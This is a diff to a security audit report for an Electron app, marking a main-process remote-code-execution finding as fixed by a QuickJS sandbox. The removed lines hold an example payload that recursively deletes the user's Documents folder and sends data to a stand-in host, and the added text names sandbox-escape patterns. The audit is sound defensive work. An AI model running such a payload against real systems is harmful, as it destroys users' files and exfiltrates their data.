@@ -13,7 +13,7 @@ string that is supplied by the renderer. Each finding is rated **CRITICAL**,
 
 | Class | Count | Top issue |
 |---|---|---|
-| **CRITICAL** — RCE in main process | 1 | `mainApi.data.transformFile` evaluates renderer-supplied JS via dynamic-function compilation |
+| **CRITICAL** — RCE in main process | 0 (was 1; resolved in 0.1.484) | `mainApi.data.transformFile` previously evaluated renderer-supplied JS via dynamic-function compilation. Now sandboxed via QuickJS WASM — see `electron/utils/safeJsExecutor.js`. |
 | **HIGH** — arbitrary path write | 5 | `saveData`, `convertJsonToCsvFile`, `parseXMLStream`, `parseCSVStream`, `readDataFromURL` |
 | **HIGH** — arbitrary path read | 4 | `readJSONFromFile`, `readLinesFromFile`, `algoliaApi.createBatchesFromFile`, `algoliaApi.partialUpdateObjectsFromDirectory` |
 | **MEDIUM** — partial scoping but `path.join` traversal | 1 | `saveData` joins under userData but accepts `../` segments |
@@ -21,32 +21,37 @@ string that is supplied by the renderer. Each finding is rated **CRITICAL**,
 
 ## Critical findings
 
-### 1. `mainApi.data.transformFile` — Remote Code Execution
+### 1. `mainApi.data.transformFile` — Remote Code Execution (RESOLVED in 0.1.484)
 
-**File:** `electron/controller/dataController.js:413-457` →
-`electron/utils/transform.js:340`
+**Original status:** RCE in main process via the dynamic-function constructor on
+renderer-supplied `mappingFunctionBody`. Removed in 0.1.484.
 
-The `mappingFunctionBody` argument is a string of JavaScript supplied by the
-renderer. It is compiled and executed in the main process via the dynamic-
-function constructor — main has full Node.js privileges (filesystem, network,
-child_process). A widget can pass:
+**Resolution:** `electron/utils/transform.js:339+` no longer compiles user JS in
+the main-process JS engine. Bodies now run in a QuickJS WASM sandbox
+(`electron/utils/safeJsExecutor.js`) with:
 
-```
-mappingFunctionBody = "require('fs').rmSync('/Users/$USER/Documents', " +
-                      "{recursive:true}); fetch('https://evil.example/x?d=' + " +
-                      "JSON.stringify(refObj)); return '';"
-```
+- No host globals (`process`, `require`, `fetch`, `module`, `globalThis-of-host` are absent)
+- 1-second per-record timeout (interrupts infinite loops)
+- 32 MB memory cap (interrupts memory bombs)
+- Disposed VM context per `transformFile` invocation; no cross-call state
 
-…and the supplied code runs as main with no isolation.
+The previous attack — `mappingFunctionBody = "require('fs').rmSync(...); ..."` —
+now errors immediately with `"'require' is not defined"`. Sandbox-escape patterns
+(`Function.constructor`, `[].constructor.constructor`) cannot reach Node globals
+because the dynamic-function constructor compiles its body INSIDE the QuickJS
+sandbox where those globals don't exist.
 
-The current code does enforce a 100 KB size cap and string-type check on
-`mappingFunctionBody`, but neither prevents arbitrary code from running.
+The sandbox properties are pinned by `electron/utils/safeJsExecutor.test.js`
+(11 tests, run as part of `npm run ci`). New escape patterns get appended to
+that test as they're discovered.
 
-**Recommended fix (urgency: emergency hotfix):**
+**What this does NOT cover:**
 
-- Short term: gate the IPC handler behind an explicit `mainApi.data.transformFile` permission that's NOT granted to widgets by default. Only the AI builder / dashboard config flows that legitimately need it should call it.
-- Better: replace the eval-based transform engine with a declarative DSL (e.g., a JSON spec describing field mappings). Removes the eval surface entirely.
-- Acceptable: parse the body in a separate isolated worker with no `require`, no `fetch`, no `process` — but JS sandboxing is notoriously hard to get right.
+- Side-channel info leakage via the returned record values — user code can still
+  encode arbitrary data into the output records and the host writes them. The
+  sandbox prevents *capability acquisition*, not data exfiltration *if the
+  caller already has read access to the input*. Out of scope for the sandbox;
+  Phase B's path-scoping limits which input files transformFile can read.
 
 ### 2–6. Arbitrary path write — `dataApi`
 
